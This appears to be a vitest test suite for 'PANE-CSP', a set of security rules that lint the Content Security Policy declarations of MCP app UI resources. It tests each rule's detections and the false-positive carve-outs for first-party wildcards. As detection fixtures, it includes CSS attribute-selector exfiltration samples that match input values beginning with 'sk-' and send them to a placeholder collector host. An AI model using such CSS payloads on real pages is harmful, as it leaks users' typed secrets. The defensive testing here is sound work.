/**
 * PANE-CSP — the family that most easily discredits the project.
 *
 * Three things are regression-locked here, and each one is a measured failure
 * rather than a hypothetical:
 *
 *  1. `csp_evaluator`'s `evaluate()` signature. The SECOND argument replaces
 *     DEFAULT_CHECKS; the first ADDS to them. `evaluate(CURATED)` therefore
 *     leaves `checkScriptUnsafeInline` and `checkScriptAllowlistBypass`
 *     running, and produces two findings on the spec's MANDATED default policy
 *     — the exact fatal false positive GOALS.md G2 rates "Fatal".
 *  2. The bypass-allowlist counts (123 JSONP URLs, 41 Angular URLs). A
 *     dependency bump that empties either list would silently turn
 *     PANE-CSP-007 into a rule that can never fire, and nothing else would
 *     notice.
 *  3. Every first-party-subdomain-wildcard carve-out. In a 21-server hand-scan
 *     EVERY wildcard hit was a false positive of that kind, and the server a
 *     naive rule would have flagged hardest was mapbox/mcp-server — the
 *     best-configured server in the corpus.
 */

import { describe, it, expect } from 'vitest';
import { readFileSync, existsSync } from 'node:fs';
import { CspParser } from 'csp_evaluator/dist/parser.js';
import { CspEvaluator } from 'csp_evaluator/dist/evaluator.js';
import { URLS as JSONP_URLS } from 'csp_evaluator/dist/allowlist_bypasses/jsonp.js';
import { URLS as ANGULAR_URLS } from 'csp_evaluator/dist/allowlist_bypasses/angular.js';

import { parseHtml } from '../src/parse/html.js';
import { buildStyleIndex } from '../src/parse/style-index.js';
import { DEFAULT_LIMITS } from '../src/limits.js';
import { sha256Resource } from '../src/acquire/hash.js';
import type {
  Finding,
  RuleContext,
  RuleResult,
  UIResource,
  UIResourceMeta,
} from '../src/types.js';
import { isGating } from '../src/exit.js';

import {
  CURATED_CHECKS,
  MANDATED_DEFAULT_POLICY,
  synthesizePolicy,
  evaluateDeclaredCsp,
  jsonpBypassFor,
  angularBypassFor,
  FORBIDDEN_CHECKS,
} from '../src/rules/csp/evaluator-adapter.js';
import { isSharedHostingWildcard, parseSource } from '../src/rules/csp/domains.js';

import { paneCsp001 } from '../src/rules/csp/csp-001-connect-wildcard.js';
import { paneCsp002 } from '../src/rules/csp/csp-002-resource-wildcard.js';
import { paneCsp003 } from '../src/rules/csp/csp-003-frame-domains.js';
import { paneCsp004 } from '../src/rules/csp/csp-004-base-uri-domains.js';
import { paneCsp005 } from '../src/rules/csp/csp-005-shared-hosting.js';
import { paneCsp006 } from '../src/rules/csp/csp-006-undeclared-origin.js';
import { paneCsp007 } from '../src/rules/csp/csp-007-jsonp-bypass.js';
import { paneCsp008 } from '../src/rules/csp/csp-008-publishable-cdn.js';
import { paneCsp009 } from '../src/rules/csp/csp-009-unused-connect-domain.js';
import { paneCsp010 } from '../src/rules/csp/csp-010-css-attribute-exfil.js';
import { paneCsp011 } from '../src/rules/csp/csp-011-opaque-frame.js';
import { paneCsp012 } from '../src/rules/csp/csp-012-cdn-script-no-integrity.js';
import { paneCsp013 } from '../src/rules/csp/csp-013-empty-csp.js';

// ---------------------------------------------------------------------------
// Harness
// ---------------------------------------------------------------------------

const ALL_RULES = [
  paneCsp001, paneCsp002, paneCsp003, paneCsp004, paneCsp005, paneCsp006, paneCsp007,
  paneCsp008, paneCsp009, paneCsp010, paneCsp011, paneCsp012, paneCsp013,
];

function makeCtx(html: string, meta: UIResourceMeta | null): RuleContext {
  const { dom } = parseHtml(html, DEFAULT_LIMITS);
  const styles = buildStyleIndex(dom, DEFAULT_LIMITS);
  const resource: UIResource = {
    uri: 'ui://test-server/view',
    mimeType: 'text/html;profile=mcp-app',
    content: html,
    ...(meta ? { meta, metaFromRead: meta } : {}),
    schemaErrors: [],
    contentHash: sha256Resource({ text: html }),
    source: 'stdio',
  };
  return {
    resource,
    dom,
    styles,
    meta,
    schemaErrors: [],
    scripts: [],
    rawSource: html,
    tools: [],
    options: {},
    limits: DEFAULT_LIMITS,
    diagnostic: () => {},
  };
}

/** `_meta.ui` carrying only a csp — the shape most of these rules read. */
const withCsp = (csp: unknown): UIResourceMeta => ({ csp } as UIResourceMeta);

const EMPTY_HTML = '<!doctype html><html><body><p>ok</p></body></html>';

function run(rule: { check(c: RuleContext): RuleResult }, html: string, meta: UIResourceMeta | null) {
  return rule.check(makeCtx(html, meta));
}

function ids(findings: Finding[]): string[] {
  return findings.map((f) => f.ruleId);
}

const FIXTURE_ROOT = new URL('../fixtures/', import.meta.url);

function fixture(kind: 'malicious' | 'nondetect', name: string) {
  const htmlUrl = new URL(`${kind}/csp/${name}.html`, FIXTURE_ROOT);
  const metaUrl = new URL(`${kind}/csp/${name}.meta.json`, FIXTURE_ROOT);
  const html = existsSync(htmlUrl) ? readFileSync(htmlUrl, 'utf8') : EMPTY_HTML;
  const meta = existsSync(metaUrl)
    ? (JSON.parse(readFileSync(metaUrl, 'utf8')) as UIResourceMeta)
    : null;
  return makeCtx(html, meta);
}

/** Every finding every PANE-CSP rule produces for one fixture. */
function scanFixture(kind: 'malicious' | 'nondetect', name: string): Finding[] {
  const ctx = fixture(kind, name);
  return ALL_RULES.flatMap((r) => r.check(ctx).findings);
}

// ---------------------------------------------------------------------------
// 1. The csp_evaluator API trap
// ---------------------------------------------------------------------------

describe('csp_evaluator adapter — the API trap that ships the fatal false positive', () => {
  const CONSTRUCTED_FROM_EMPTY = synthesizePolicy({}).policy;

  it('DEMONSTRATES the trap: evaluate(CURATED) still runs DEFAULT_CHECKS', () => {
    // The first argument ADDS checks against the parsed CSP. Only the SECOND
    // replaces DEFAULT_CHECKS. This assertion exists so the failure mode is
    // recorded in the test suite rather than only in a comment.
    for (const policy of [MANDATED_DEFAULT_POLICY, CONSTRUCTED_FROM_EMPTY]) {
      const parsed = new CspParser(policy).csp;
      const wrong = new CspEvaluator(parsed).evaluate([...CURATED_CHECKS] as Parameters<CspEvaluator['evaluate']>[0]);
      expect(wrong.length, `evaluate(CURATED) on ${policy}`).toBe(2);
      expect(wrong.map((f) => f.value)).toContain("'unsafe-inline'");
      expect(wrong.map((f) => f.value)).toContain("'self'");
    }
  });

  it('produces ZERO findings on the spec-mandated default policy', () => {
    expect(evaluateDeclaredCsp(undefined).raw).toEqual([]);
  });

  it('produces ZERO findings on the policy constructed from an empty csp', () => {
    expect(evaluateDeclaredCsp({}).raw).toEqual([]);
  });

  it('never carries a check that flags unsafe-inline or a bare `self`', () => {
    const names = CURATED_CHECKS.map((c) => c.name);
    expect(names).toEqual(['checkSrcHttp', 'checkIpSource', 'checkPlainUrlSchemes']);
    for (const forbidden of FORBIDDEN_CHECKS) {
      expect(names).not.toContain(forbidden);
    }
  });

  it('synthesizes the policy from the spec construction block', () => {
    const { policy } = synthesizePolicy({
      connectDomains: ['https://api.example.com'],
      resourceDomains: ['https://cdn.example.com'],
    });
    expect(policy).toContain("default-src 'none'");
    expect(policy).toContain("script-src 'self' 'unsafe-inline' https://cdn.example.com");
    expect(policy).toContain("connect-src 'self' https://api.example.com");
    expect(policy).toContain("frame-src 'none'");
    expect(policy).toContain("object-src 'none'");
    expect(policy).toContain("base-uri 'self'");
    // form-action is absent from BOTH spec policies. Synthesizing one would
    // invent a control the spec does not provide — see RULES.md § PANE-EXFIL.
    expect(policy).not.toContain('form-action');
  });

  it('collapses the resourceDomains five-directive fan-out back to (array, index)', () => {
    // `data:` in resourceDomains lands in five directives. csp_evaluator reports
    // it once per XSS-causing directive; the operator declared it once.
    const { collapsed } = evaluateDeclaredCsp({ resourceDomains: ['data:'] });
    expect(collapsed).toHaveLength(1);
    expect(collapsed[0]!.array).toBe('resourceDomains');
    expect(collapsed[0]!.index).toBe(0);
  });
});

describe('csp_evaluator bypass allowlists — tamper detection', () => {
  it('carries exactly 123 JSONP URLs and 41 Angular URLs', () => {
    // A dependency bump that empties either list turns PANE-CSP-007 into a rule
    // that can never fire, and no other test would notice.
    expect(JSONP_URLS.length).toBe(123);
    expect(ANGULAR_URLS.length).toBe(41);
  });

  it('matches a hosted Angular copy and a JSONP endpoint through the deep-imported data', () => {
    expect(jsonpBypassFor('https://ajax.googleapis.com')).toBeTruthy();
    expect(angularBypassFor('https://cdn.jsdelivr.net')).toBeTruthy();
  });

  it('does not match the reference corpus origins', () => {
    // pdf-server's unpkg.com and mapbox's api.mapbox.com must stay clean.
    expect(jsonpBypassFor('https://unpkg.com')).toBeNull();
    expect(angularBypassFor('https://unpkg.com')).toBeNull();
    expect(jsonpBypassFor('https://api.mapbox.com')).toBeNull();
    expect(angularBypassFor('https://api.mapbox.com')).toBeNull();
  });
});

// ---------------------------------------------------------------------------
// 2. Source-expression parsing and the shared-hosting predicate
// ---------------------------------------------------------------------------

describe('CSP source-expression parsing', () => {
  it('classifies a bare wildcard in every spelling', () => {
    for (const s of ['*', ' * ', 'https://*', 'http://*', '//*', '*://*']) {
      expect(parseSource(s).kind, s).toBe('bare-wildcard');
    }
  });

  it('classifies a scheme-only source', () => {
    for (const s of ['https:', 'http:', 'data:', 'blob:', 'wss:']) {
      expect(parseSource(s).kind, s).toBe('scheme-only');
    }
  });

  it('classifies a first-party subdomain wildcard as an ordinary host', () => {
    const p = parseSource('https://*.mapbox.com');
    expect(p.kind).toBe('host');
    expect(p.host).toBe('*.mapbox.com');
    expect(p.scheme).toBe('https');
  });
});

describe('PANE-CSP-005 shared-hosting predicate — the PSL delta, narrowed', () => {
  it('fires on suffixes any stranger can publish to', () => {
    for (const h of ['*.github.io', '*.pages.dev', '*.netlify.app', '*.vercel.app', '*.workers.dev']) {
      expect(isSharedHostingWildcard(h), h).not.toBeNull();
    }
  });

  it('fires on a hand-listed stranger-publishable suffix the PSL delta misses', () => {
    // glitch.me and surge.sh are NOT in the PSL private section: their private
    // and ICANN suffixes are identical, so the delta alone returns nothing.
    for (const h of ['*.glitch.me', '*.surge.sh']) {
      expect(isSharedHostingWildcard(h), h).not.toBeNull();
    }
  });

  it('fires on a wildcard sitting directly on a TLD', () => {
    expect(isSharedHostingWildcard('*.com')).not.toBeNull();
  });

  it('produces NOTHING for a first-party subdomain wildcard', () => {
    // mapbox/mcp-server. Flagging this is the G2 failure in its purest form.
    expect(isSharedHostingWildcard('*.mapbox.com')).toBeNull();
    expect(isSharedHostingWildcard('api.mapbox.com')).toBeNull();
  });

  it('produces NOTHING for a first-party bucket wildcard on a cloud-storage suffix', () => {
    // The PSL delta matches s3.amazonaws.com and blob.core.windows.net too, but
    // a first-party bucket is not the threat — only a wildcard AT the suffix is.
    expect(isSharedHostingWildcard('*.mycorp.blob.core.windows.net')).toBeNull();
    expect(isSharedHostingWildcard('*.mybucket.s3.amazonaws.com')).toBeNull();
  });

  it('still fires when the wildcard sits AT a cloud-storage suffix', () => {
    expect(isSharedHostingWildcard('*.s3.amazonaws.com')).not.toBeNull();
  });

  it('produces NOTHING for a bare wildcard — that is -001/-002 territory', () => {
    expect(isSharedHostingWildcard('*')).toBeNull();
  });

  it('produces NOTHING for a host tldts cannot place in the PSL', () => {
    expect(isSharedHostingWildcard('*.localhost')).toBeNull();
  });
});

// ---------------------------------------------------------------------------
// 3. Per-rule behaviour
// ---------------------------------------------------------------------------

describe('PANE-CSP-001 — bare or scheme-only wildcard in connectDomains', () => {
  it('fires on a bare wildcard', () => {
    const r = run(paneCsp001, EMPTY_HTML, withCsp({ connectDomains: ['*'] }));
    expect(ids(r.findings)).toEqual(['PANE-CSP-001']);
    expect(r.findings[0]!.severity).toBe('HIGH');
    expect(r.findings[0]!.confidence).toBe('CERTAIN');
    expect(r.findings[0]!.jsonPointer).toBe('/ui/csp/connectDomains/0');
  });

  it('fires on a scheme-only wildcard', () => {
    const r = run(paneCsp001, EMPTY_HTML, withCsp({ connectDomains: ['https:'] }));
    expect(r.findings).toHaveLength(1);
  });

  it('produces NOTHING for a first-party subdomain wildcard', () => {
    const r = run(
      paneCsp001,
      EMPTY_HTML,
      withCsp({ connectDomains: ['https://*.mapbox.com', 'https://events.mapbox.com'] }),
    );
    expect(r.findings).toEqual([]);
  });

  it('produces NOTHING when there is no _meta at all', () => {
    expect(run(paneCsp001, EMPTY_HTML, null).findings).toEqual([]);
  });
});

describe('PANE-CSP-002 — bare or scheme-only wildcard in resourceDomains', () => {
  it('fires at CRITICAL on a bare wildcard', () => {
    const r = run(paneCsp002, EMPTY_HTML, withCsp({ resourceDomains: ['*'] }));
    expect(ids(r.findings)).toEqual(['PANE-CSP-002']);
    expect(r.findings[0]!.severity).toBe('CRITICAL');
  });

  it('fires on a scheme-only source, corroborated by csp_evaluator', () => {
    const r = run(paneCsp002, EMPTY_HTML, withCsp({ resourceDomains: ['data:'] }));
    expect(r.findings).toHaveLength(1);
  });

  it('produces NOTHING for a first-party subdomain wildcard', () => {
    // RULES.md's -002 row says "contains `*`". That text is wrong: the -001
    // carve-out applies here too, and without it mapbox/mcp-server's
    // resourceDomains would break a build at CRITICAL.
    const r = run(paneCsp002, EMPTY_HTML, withCsp({ resourceDomains: ['https://*.mapbox.com'] }));
    expect(r.findings).toEqual([]);
  });
});

describe('PANE-CSP-003 / -004 — frameDomains and baseUriDomains widen a default', () => {
  it('-003 fires once for a non-empty frameDomains', () => {
    const r = run(paneCsp003, EMPTY_HTML, withCsp({ frameDomains: ['https://a.example.com', 'https://b.example.com'] }));
    expect(ids(r.findings)).toEqual(['PANE-CSP-003']);
    expect(r.findings[0]!.jsonPointer).toBe('/ui/csp/frameDomains');
  });

  it('-003 produces nothing for an empty array — that is -013', () => {
    expect(run(paneCsp003, EMPTY_HTML, withCsp({ frameDomains: [] })).findings).toEqual([]);
  });

  it('-004 fires once for a non-empty baseUriDomains', () => {
    const r = run(paneCsp004, EMPTY_HTML, withCsp({ baseUriDomains: ['https://a.example.com'] }));
    expect(ids(r.findings)).toEqual(['PANE-CSP-004']);
  });
});

describe('PANE-CSP-005 — shared hosting', () => {
  it('fires on a wildcard over a user-publishable suffix', () => {
    const r = run(paneCsp005, EMPTY_HTML, withCsp({ resourceDomains: ['https://*.github.io'] }));
    expect(ids(r.findings)).toEqual(['PANE-CSP-005']);
    expect(r.findings[0]!.severity).toBe('HIGH');
  });

  it('produces NOTHING for the mapbox declaration, in full', () => {
    const r = run(
      paneCsp005,
      EMPTY_HTML,
      withCsp({
        connectDomains: ['https://*.mapbox.com', 'https://events.mapbox.com'],
        resourceDomains: ['https://api.mapbox.com'],
      }),
    );
    expect(r.findings).toEqual([]);
  });
});

describe('PANE-CSP-006 — HTML references an origin no declaration covers', () => {
  const CSP = withCsp({ resourceDomains: ['https://cdn.example.com'] });

  it('fires on an undeclared image origin', () => {
    const r = run(paneCsp006, '<img src="https://tracker.invalid/p.gif">', CSP);
    expect(ids(r.findings)).toEqual(['PANE-CSP-006']);
    expect(r.findings[0]!.ruleClass).toBe('INFO');
    expect(r.findings[0]!.severity).toBe('LOW');
  });

  it('produces nothing for a declared origin', () => {
    expect(run(paneCsp006, '<img src="https://cdn.example.com/p.gif">', CSP).findings).toEqual([]);
  });

  it('produces nothing for a subdomain covered by a declared wildcard', () => {
    const meta = withCsp({ resourceDomains: ['https://*.mapbox.com'] });
    expect(run(paneCsp006, '<img src="https://api.mapbox.com/x.png">', meta).findings).toEqual([]);
  });

  it('EXCLUDES <a href>, <form action>, and non-fetch URL forms', () => {
    // Six of eight reference servers would produce findings otherwise.
    const html = [
      '<a href="https://docs.invalid/help">docs</a>',
      '<form action="https://collector.invalid/c"><button>go</button></form>',
      '<img src="data:image/gif;base64,R0lGOD">',
      '<img src="blob:https://x.invalid/1">',
      '<img src="/local.png">',
      '<img src="rel.png">',
      '<img src="#frag">',
      '<a href="mailto:a@b.invalid">mail</a>',
    ].join('');
    expect(run(paneCsp006, html, CSP).findings).toEqual([]);
  });

  it('reports one finding per distinct origin, not per reference', () => {
    const html = Array.from({ length: 5 }, (_, i) => `<img src="https://tracker.invalid/${i}.gif">`).join('');
    expect(run(paneCsp006, html, CSP).findings).toHaveLength(1);
  });
});

describe('PANE-CSP-007 — JSONP endpoint or hosted Angular copy in resourceDomains', () => {
  it('fires on a hosted Angular copy', () => {
    const r = run(paneCsp007, EMPTY_HTML, withCsp({ resourceDomains: ['https://ajax.googleapis.com'] }));
    expect(ids(r.findings)).toEqual(['PANE-CSP-007']);
    expect(r.findings[0]!.confidence).toBe('MEDIUM');
  });

  it('never reads connectDomains — an open redirector there buys nothing', () => {
    const r = run(paneCsp007, EMPTY_HTML, withCsp({ connectDomains: ['https://ajax.googleapis.com'] }));
    expect(r.findings).toEqual([]);
  });

  it('produces nothing for pdf-server unpkg or mapbox', () => {
    expect(run(paneCsp007, EMPTY_HTML, withCsp({ resourceDomains: ['https://unpkg.com'] })).findings).toEqual([]);
    expect(run(paneCsp007, EMPTY_HTML, withCsp({ resourceDomains: ['https://api.mapbox.com'] })).findings).toEqual([]);
  });
});

describe('PANE-CSP-008 / -012 — user-publishable CDN, and the escalation', () => {
  const UNPKG = withCsp({ resourceDomains: ['https://unpkg.com'] });

  it('-008 reports the latent grant at MEDIUM, below the default gate', () => {
    const r = run(paneCsp008, EMPTY_HTML, UNPKG);
    expect(ids(r.findings)).toEqual(['PANE-CSP-008']);
    expect(r.findings[0]!.severity).toBe('MEDIUM');
    expect(isGating(r.findings[0]!, 'HIGH')).toBe(false);
  });

  it('-008 does not break the build for pdf-server, which only loads fonts', () => {
    // pdf-server/server.ts declares resourceDomains: ["https://unpkg.com"] for
    // the pdf.js Standard-14 fonts. Legitimate, deliberate, documented.
    const html = '<style>@font-face{font-family:F;src:url(https://unpkg.com/pdfjs-dist/standard_fonts/F.pfb)}</style>';
    const findings = [paneCsp008, paneCsp012].flatMap((r) => run(r, html, UNPKG).findings);
    expect(findings.filter((f) => isGating(f, 'HIGH'))).toEqual([]);
  });

  it('-012 escalates to HIGH when a script actually executes from that origin without integrity', () => {
    const r = run(paneCsp012, '<script src="https://unpkg.com/chart.js"></script>', UNPKG);
    expect(ids(r.findings)).toEqual(['PANE-CSP-012']);
    expect(r.findings[0]!.severity).toBe('HIGH');
  });

  it('-012 does not fire when the script carries an integrity attribute', () => {
    const html = '<script src="https://unpkg.com/chart.js" integrity="sha384-abc"></script>';
    expect(run(paneCsp012, html, UNPKG).findings).toEqual([]);
  });

  it('-008 does not fire on a version-pinned path', () => {
    const meta = withCsp({ resourceDomains: ['https://unpkg.com/pdfjs-dist@4.0.379/'] });
    expect(run(paneCsp008, EMPTY_HTML, meta).findings).toEqual([]);
  });

  it('-008 does not fire on a first-party CDN', () => {
    expect(run(paneCsp008, EMPTY_HTML, withCsp({ resourceDomains: ['https://cdn.mycorp.com'] })).findings).toEqual([]);
  });
});

describe('PANE-CSP-009 — over-declared connect domain', () => {
  it('fires when the declared host appears nowhere in the resource', () => {
    const r = run(paneCsp009, EMPTY_HTML, withCsp({ connectDomains: ['https://unused.invalid'] }));
    expect(ids(r.findings)).toEqual(['PANE-CSP-009']);
    expect(r.findings[0]!.confidence).toBe('MEDIUM');
  });

  it('produces nothing when the host appears in the document', () => {
    const html = '<script>fetch("https://api.example.com/v1")</script>';
    expect(run(paneCsp009, html, withCsp({ connectDomains: ['https://api.example.com'] })).findings).toEqual([]);
  });

  it('resolves a wildcard against its base domain', () => {
    const html = '<script>fetch("https://api.mapbox.com/v1")</script>';
    expect(run(paneCsp009, html, withCsp({ connectDomains: ['https://*.mapbox.com'] })).findings).toEqual([]);
  });
});

describe('PANE-CSP-010 — CSS attribute-selector exfiltration', () => {
  it('fires on a value-bearing prefix matcher with an absolute url()', () => {
    const html = '<style>input[value^="sk-"]{background:url(https://collector.invalid/a)}</style><input value="">';
    const r = run(paneCsp010, html, null);
    expect(ids(r.findings)).toEqual(['PANE-CSP-010']);
    expect(r.findings[0]!.confidence).toBe('MEDIUM');
  });

  it('fires through :has()', () => {
    const html = '<style>form:has(input[value$="9"]){background-image:url(https://collector.invalid/b)}</style>';
    expect(run(paneCsp010, html, null).findings).toHaveLength(1);
  });

  it('produces NOTHING for the ubiquitous icon-sprite idiom', () => {
    // `[class*="icon"]{background:url(...)}` is legitimate and everywhere.
    const html = '<style>[class*="icon"]{background:url(https://cdn.example.com/sprite.png)}</style>';
    expect(run(paneCsp010, html, null).findings).toEqual([]);
  });

  it('produces nothing for an exact-match attribute selector', () => {
    const html = '<style>input[type="text"]{background:url(https://cdn.example.com/i.png)}</style>';
    expect(run(paneCsp010, html, null).findings).toEqual([]);
  });

  it('produces nothing for a relative or data: url()', () => {
    const html = '<style>input[value^="a"]{background:url(/local.png)}input[value^="b"]{background:url(data:image/gif;base64,R0lGOD)}</style>';
    expect(run(paneCsp010, html, null).findings).toEqual([]);
  });
});

describe('PANE-CSP-011 — nested frame from an opaque source', () => {
  it('fires on srcdoc', () => {
    const r = run(paneCsp011, '<iframe srcdoc="<p>x</p>"></iframe>', null);
    expect(ids(r.findings)).toEqual(['PANE-CSP-011']);
    expect(r.findings[0]!.confidence).toBe('CERTAIN');
  });

  it('fires on data: and blob: frame sources', () => {
    const html = '<iframe src="data:text/html,x"></iframe><iframe src="blob:https://a.invalid/1"></iframe>';
    expect(run(paneCsp011, html, null).findings).toHaveLength(2);
  });

  it('produces nothing for an ordinary https frame', () => {
    expect(run(paneCsp011, '<iframe src="https://embed.example.com/x"></iframe>', null).findings).toEqual([]);
  });
});

describe('PANE-CSP-013 — csp present but empty', () => {
  it('fires on the two shapes confirmed in the wild', () => {
    // Both were written to mean "this app makes no network requests". Both
    // received `connect-src 'self'` instead of `'none'`.
    for (const csp of [
      { connectDomains: [], resourceDomains: [] },
      { connectDomains: [], resourceDomains: [] },
    ]) {
      const r = run(paneCsp013, EMPTY_HTML, withCsp(csp));
      expect(ids(r.findings)).toEqual(['PANE-CSP-013']);
    }
  });

  it('fires on `csp: {}`', () => {
    expect(run(paneCsp013, EMPTY_HTML, withCsp({})).findings).toHaveLength(1);
  });

  it('is NOT implemented as Object.keys(csp).length === 0', () => {
    // That test misses both real-world confirmations, which carried two keys.
    const r = run(paneCsp013, EMPTY_HTML, withCsp({ connectDomains: [], resourceDomains: [] }));
    expect(r.findings).toHaveLength(1);
  });

  it('produces nothing when any field carries a value', () => {
    const meta = withCsp({ connectDomains: [], resourceDomains: ['https://cdn.example.com'] });
    expect(run(paneCsp013, EMPTY_HTML, meta).findings).toEqual([]);
  });

  it('produces nothing when csp is absent entirely — that is the restrictive default', () => {
    expect(run(paneCsp013, EMPTY_HTML, {} as UIResourceMeta).findings).toEqual([]);
    expect(run(paneCsp013, EMPTY_HTML, null).findings).toEqual([]);
  });
});

// ---------------------------------------------------------------------------
// 4. Family-wide invariants
// ---------------------------------------------------------------------------

describe('PANE-CSP family invariants', () => {
  it('declares all thirteen IDs exactly once, none renumbered', () => {
    expect(ALL_RULES.map((r) => r.id).sort()).toEqual([
      'PANE-CSP-001', 'PANE-CSP-002', 'PANE-CSP-003', 'PANE-CSP-004', 'PANE-CSP-005',
      'PANE-CSP-006', 'PANE-CSP-007', 'PANE-CSP-008', 'PANE-CSP-009', 'PANE-CSP-010',
      'PANE-CSP-011', 'PANE-CSP-012', 'PANE-CSP-013',
    ]);
  });

  it('matches the RULES.md table on class, severity and confidence', () => {
    const table: Record<string, [string, string, string]> = {
      'PANE-CSP-001': ['RISK', 'HIGH', 'CERTAIN'],
      'PANE-CSP-002': ['RISK', 'CRITICAL', 'CERTAIN'],
      'PANE-CSP-003': ['RISK', 'MEDIUM', 'CERTAIN'],
      'PANE-CSP-004': ['RISK', 'MEDIUM', 'CERTAIN'],
      'PANE-CSP-005': ['RISK', 'HIGH', 'HIGH'],
      'PANE-CSP-006': ['INFO', 'LOW', 'HIGH'],
      'PANE-CSP-007': ['RISK', 'HIGH', 'MEDIUM'],
      'PANE-CSP-008': ['RISK', 'MEDIUM', 'HIGH'],
      'PANE-CSP-009': ['RISK', 'LOW', 'MEDIUM'],
      'PANE-CSP-010': ['RISK', 'HIGH', 'MEDIUM'],
      'PANE-CSP-011': ['RISK', 'MEDIUM', 'CERTAIN'],
      'PANE-CSP-012': ['RISK', 'HIGH', 'HIGH'],
      'PANE-CSP-013': ['INFO', 'LOW', 'CERTAIN'],
    };
    for (const rule of ALL_RULES) {
      expect([rule.ruleClass, rule.severity, rule.confidence], rule.id).toEqual(table[rule.id]);
    }
  });

  it('requires `meta`, so directory mode skips the family rather than guessing', () => {
    for (const rule of ALL_RULES) {
      expect(rule.requires, rule.id).toContain('meta');
    }
  });

  it('attaches the CSP-synthesis assumption to every finding it produces', () => {
    const html = [
      '<img src="https://tracker.invalid/p.gif">',
      '<script src="https://unpkg.com/c.js"></script>',
      '<iframe srcdoc="<p>x</p>"></iframe>',
      '<style>input[value^="sk-"]{background:url(https://collector.invalid/a)}</style>',
    ].join('');
    const meta = withCsp({
      connectDomains: ['*'],
      resourceDomains: ['*', 'https://unpkg.com', 'https://*.github.io', 'https://ajax.googleapis.com'],
      frameDomains: ['https://f.example.com'],
      baseUriDomains: ['https://b.example.com'],
    });
    const ctx = makeCtx(html, meta);
    const findings = ALL_RULES.flatMap((r) => r.check(ctx).findings);
    expect(findings.length).toBeGreaterThan(6);
    for (const f of findings) {
      expect(f.assumption, f.ruleId).toBeTruthy();
    }
  });

  it('never emits a finding about `unsafe-inline` or an inline script', () => {
    const html = '<script>console.log(1)</script><div onclick="x()">y</div><style>p{color:red}</style>';
    const ctx = makeCtx(html, withCsp({ connectDomains: ['*'], resourceDomains: ['*'] }));
    const findings = ALL_RULES.flatMap((r) => r.check(ctx).findings);
    for (const f of findings) {
      expect(`${f.message} ${f.evidence ?? ''}`.toLowerCase(), f.ruleId).not.toContain('unsafe-inline');
    }
  });

  it('produces gate-eligible findings only for the four rules that may break a build', () => {
    const meta = withCsp({ connectDomains: ['*'], resourceDomains: ['*', 'https://*.pages.dev'] });
    const ctx = makeCtx('<script src="https://unpkg.com/c.js"></script>', {
      ...meta,
      csp: { ...(meta.csp as object), resourceDomains: ['*', 'https://*.pages.dev', 'https://unpkg.com'] },
    } as UIResourceMeta);
    const gating = ALL_RULES.flatMap((r) => r.check(ctx).findings).filter((f) => isGating(f, 'HIGH'));
    expect([...new Set(gating.map((f) => f.ruleId))].sort()).toEqual([
      'PANE-CSP-001', 'PANE-CSP-002', 'PANE-CSP-005', 'PANE-CSP-012',
    ]);
  });

  it('gives every finding a stable, non-line-number fingerprint', () => {
    const meta = withCsp({ connectDomains: ['*'] });
    const a = run(paneCsp001, EMPTY_HTML, meta).findings[0]!;
    const b = run(paneCsp001, `\n\n\n${EMPTY_HTML}`, meta).findings[0]!;
    expect(a.fingerprint).toBe(b.fingerprint);
  });

  it('survives hostile _meta shapes without throwing', () => {
    const shapes: unknown[] = [
      { csp: null },
      { csp: 'not an object' },
      { csp: { connectDomains: 'https://a.invalid' } },
      { csp: { resourceDomains: [null, 42, {}, ''] } },
      { csp: { frameDomains: [{ toString: () => { throw new Error('boom'); } }] } },
    ];
    for (const shape of shapes) {
      const ctx = makeCtx(EMPTY_HTML, shape as UIResourceMeta);
      for (const rule of ALL_RULES) {
        expect(() => rule.check(ctx), `${rule.id} on ${JSON.stringify(shape)}`).not.toThrow();
      }
    }
  });
});

// ---------------------------------------------------------------------------
// 5. Fixtures
// ---------------------------------------------------------------------------

describe('fixtures/malicious/csp — each rule has a positive case', () => {
  const cases: Array<[string, string]> = [
    ['wildcard-connect', 'PANE-CSP-001'],
    ['wildcard-resource', 'PANE-CSP-002'],
    ['frame-and-base-widened', 'PANE-CSP-003'],
    ['frame-and-base-widened', 'PANE-CSP-004'],
    ['shared-hosting-wildcard', 'PANE-CSP-005'],
    ['undeclared-origin', 'PANE-CSP-006'],
    ['jsonp-bypass', 'PANE-CSP-007'],
    ['publishable-cdn-script', 'PANE-CSP-008'],
    ['publishable-cdn-script', 'PANE-CSP-012'],
    ['unused-connect-domain', 'PANE-CSP-009'],
    ['css-attribute-exfil', 'PANE-CSP-010'],
    ['opaque-frame', 'PANE-CSP-011'],
    ['empty-csp-typescript', 'PANE-CSP-013'],
    ['empty-csp-python', 'PANE-CSP-013'],
  ];

  for (const [name, ruleId] of cases) {
    it(`${name} produces ${ruleId}`, () => {
      expect(ids(scanFixture('malicious', name))).toContain(ruleId);
    });
  }
});

describe('fixtures/nondetect/csp — conformant declarations must produce ZERO findings', () => {
  // These are the shapes measured in the reference corpus and the 21-server
  // hand-scan. A finding on any of them is the highest-severity bug this
  // project has (GOALS.md G2).
  for (const name of ['mapbox-first-party', 'no-csp-declared', 'icon-sprite', 'first-party-bucket']) {
    it(`${name} scans clean`, () => {
      expect(scanFixture('nondetect', name)).toEqual([]);
    });
  }

  it('pdf-server-unpkg produces one MEDIUM finding and nothing gate-eligible', () => {
    const findings = scanFixture('nondetect', 'pdf-server-unpkg');
    expect(ids(findings)).toEqual(['PANE-CSP-008']);
    expect(findings.filter((f) => isGating(f, 'HIGH'))).toEqual([]);
  });
});
